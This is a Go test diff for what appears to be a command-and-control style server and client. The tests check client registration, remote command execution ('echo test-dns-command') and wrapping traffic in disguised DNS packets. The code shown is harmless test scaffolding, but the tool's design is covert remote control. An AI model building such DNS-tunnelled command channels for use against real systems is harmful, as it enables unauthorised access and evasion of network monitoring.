@@ -128,3 +128,107 @@ func TestServerClientInteraction(t *testing.T) {
 	// Give client time to process
 	time.Sleep(1 * time.Second)
 }
+
+// TestDNSProtocolInteraction tests server-client interaction using DNS protocol obfuscation
+func TestDNSProtocolInteraction(t *testing.T) {
+	// Create server
+	server, err := NewServer(
+		WithServerKey("1234567890123456"),
+		WithServerAddress("0.0.0.0:9003"),
+	)
+	if err != nil {
+		t.Fatalf("Failed to create server: %v", err)
+	}
+	defer server.Stop()
+
+	// Start server (includes console processing automatically)
+	go server.Start()
+
+	// Give server time to start
+	time.Sleep(500 * time.Millisecond)
+
+	// Create client with DNS protocol
+	client, err := NewClient(
+		WithClientKey("1234567890123456"),
+		WithClientAddress("localhost:9003"),
+		WithClientIdentifier("test-dns-client-001"),
+		WithClientInterval(1*time.Second),
+		WithClientProtocol(ProtocolDNS),
+		WithClientDomain("example.com"),
+	)
+	if err != nil {
+		t.Fatalf("Failed to create client: %v", err)
+	}
+	defer client.Stop()
+
+	// Start client
+	go client.Start()
+
+	// Wait for client to send probe with DNS protocol
+	time.Sleep(2 * time.Second)
+
+	// Check if client is registered on server with DNS protocol
+	server.clientsMu.RLock()
+	clientInfo, exists := server.clients["test-dns-client-001"]
+	server.clientsMu.RUnlock()
+
+	if !exists {
+		t.Error("Expected client to be registered on server")
+		return
+	}
+
+	if clientInfo.Identifier != "test-dns-client-001" {
+		t.Errorf("Expected client identifier 'test-dns-client-001', got '%s'", clientInfo.Identifier)
+	}
+
+	if clientInfo.Protocol != ProtocolDNS {
+		t.Errorf("Expected client protocol '%s', got '%s'", ProtocolDNS, clientInfo.Protocol)
+	}
+
+	// Test command execution over DNS protocol
+	command := "echo test-dns-command"
+	server.executeCommand("test-dns-client-001", command)
+
+	// Give client time to process
+	time.Sleep(1 * time.Second)
+}
+
+// TestDNSWrapper tests DNS protocol wrapping and unwrapping functionality
+func TestDNSWrapper(t *testing.T) {
+	wrapper := NewDNSWrapper("example.com")
+
+	// Test data to wrap
+	testData := []byte("test-payload-for-dns")
+
+	// Wrap the data
+	wrappedData, err := wrapper.Wrap(testData)
+	if err != nil {
+		t.Fatalf("Failed to wrap data: %v", err)
+	}
+
+	// Verify wrapped data is different from original
+	if bytes.Equal(wrappedData, testData) {
+		t.Error("Wrapped data should be different from original data")
+	}
+
+	// Unwrap the data
+	unwrappedData, err := wrapper.Unwrap(wrappedData)
+	if err != nil {
+		t.Fatalf("Failed to unwrap data: %v", err)
+	}
+
+	// Verify unwrapped data matches original
+	if !bytes.Equal(unwrappedData, testData) {
+		t.Errorf("Expected unwrapped data %v, got %v", testData, unwrappedData)
+	}
+
+	// Test IsValid functionality
+	if !wrapper.IsValid(wrappedData) {
+		t.Error("Valid DNS packet should pass IsValid check")
+	}
+
+	// Test invalid data
+	if wrapper.IsValid([]byte("invalid")) {
+		t.Error("Invalid data should not pass IsValid check")
+	}
+}
